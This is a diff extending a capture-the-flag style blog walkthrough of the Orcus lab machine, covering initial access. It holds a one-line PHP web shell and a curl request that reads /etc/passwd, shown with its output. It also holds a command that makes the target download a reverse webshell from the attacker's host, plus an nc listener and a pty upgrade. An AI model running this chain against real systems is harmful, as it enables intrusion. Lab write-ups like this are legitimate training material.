@@ -503,6 +503,8 @@ END_TIME: Mon Aug  7 21:08:10 2017
 DOWNLOADED: 1575266 - FOUND: 12
 {% endhighlight %}
 
+## Gaining Access
+
 http://10.37.129.9/admin/
 
 Tried root/password and root/root no luck, moving on.
@@ -533,7 +535,6 @@ http://10.37.129.9/backups/
 </body></html>
 {% endhighlight %}
 
-
 {% highlight bash %}
 wget http://10.37.129.9/backups/SimplePHPQuiz-Backupz.tar.gz
 tar -zxvf SimplePHPQuiz-Backupz.tar.gz
@@ -551,4 +552,109 @@ http://10.37.129.9/admin/
 dbuser:dbpassword
 
 success
+
+Still nothing....
+
+http://10.37.129.9/zenphoto
+
+Loads up the zenphoto installer, so I set it up with the db credentials from the SimplePHPQuiz configs.
+
+Now add my own admin user, admin:dr0wss4p!
+
+Poke around a bit to try and upload a file, then looking through plugins I see the option to enable elFinder, turn it on and create a shell.php file, then edit the file in elFinder:
+
+{% highlight php %}
+<?php system($_GET["cmd"]); ?>
+{% endlight %}
+
+This will serve as a starting point to getting a real reverse shell going:
+
+curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=cat%20/etc/passwd
+
+To test it out:
+
+{% highlight bash %}
+curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=cat%20/etc/passwd
+*   Trying 10.37.129.9...
+* TCP_NODELAY set
+* Connected to 10.37.129.9 (10.37.129.9) port 80 (#0)
+> GET /zenphoto/uploaded/shell.php?cmd=cat%20/etc/passwd HTTP/1.1
+> Host: 10.37.129.9
+> User-Agent: curl/7.52.1
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< Date: Tue, 08 Aug 2017 04:37:55 GMT
+< Server: Apache/2.4.18 (Ubuntu)
+< Vary: Accept-Encoding
+< Content-Length: 2156
+< Content-Type: text/html; charset=UTF-8
+<
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+syslog:x:101:104::/home/syslog:/bin/false
+mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:107::/var/run/dbus:/bin/false
+bind:x:104:114::/var/cache/bind:/bin/false
+postfix:x:105:115::/var/spool/postfix:/bin/false
+dovecot:x:106:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:107:118:Dovecot login user,,,:/nonexistent:/bin/false
+landscape:x:108:119::/var/lib/landscape:/bin/false
+sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
+postgres:x:110:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+avahi:x:111:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+colord:x:112:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+kippo:x:1001:27::/home/kippo:/bin/bash
+statd:x:113:65534::/var/lib/nfs:/bin/false
+systemd-timesync:x:114:125:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:115:126:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:116:127:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:117:128:systemd Bus Proxy,,,:/run/systemd:/bin/false
+uuidd:x:100:101::/run/uuidd:/bin/false
+lxd:x:118:65534::/var/lib/lxd/:/bin/false
+_apt:x:119:65534::/nonexistent:/bin/false
+dnsmasq:x:120:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+* Curl_http_done: called premature == 0
+* Connection #0 to host 10.37.129.9 left intact
+{% endhighlight %}
+
+Now to get a better shell:
+
+{% highlight bash %}
+screen python -m SimpleHTTPServer
+curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=wget%20http://10.37.129.5:8000/php_reverse_webshell.php
+sudo nc sudo nc -vnlp 443
+Connection from 10.37.129.9 44708 received!
+Linux Orcus 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 i686 i686 GNU/Linux
+ 00:44:17 up  2:22,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ export TERM=xterm
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@Orcus:/var/www$
+cd /
+locate flag.txt
+cat /var/www/flag.txt
+{% endhighlight %}
+
+There's the first flag
+
+## PrivEsc
 
